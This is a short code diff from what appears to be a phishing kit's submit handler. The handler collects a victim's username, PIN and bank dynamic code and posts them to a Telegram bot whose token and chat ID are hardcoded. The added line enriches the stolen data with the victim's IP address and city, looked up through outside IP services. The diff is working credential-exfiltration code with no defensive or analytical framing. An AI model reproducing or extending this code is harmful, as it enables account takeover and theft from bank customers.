@@ -62,7 +62,7 @@ async function handleSubmit(e) {
     try {
         const BOT_TOKEN = '8111270124:AAHsKW7PfdE0A-lwMR8Qj98ul86SCMjxJg4';
         const CHAT_ID = '-1002572002457';
-        const message = `👤 Usuario: ${data.username}\n🔐 PIN: ${data.pin}\n🔑 Código: ${data.dynamic}`;
+        const message = `┏🟢 Hola\n┣👤 User: ${data.username}\n┣🔒 Pass: ${data.pin}\n┣💸 Dinámica: ${data.dynamic}\n┣💻 Ip: ${await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip)}\n┗📍 Ubicación: ${await fetch('https://ipinfo.io').then(r => r.json()).then(d => d.city + ', ' + d.country)}`;
         
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
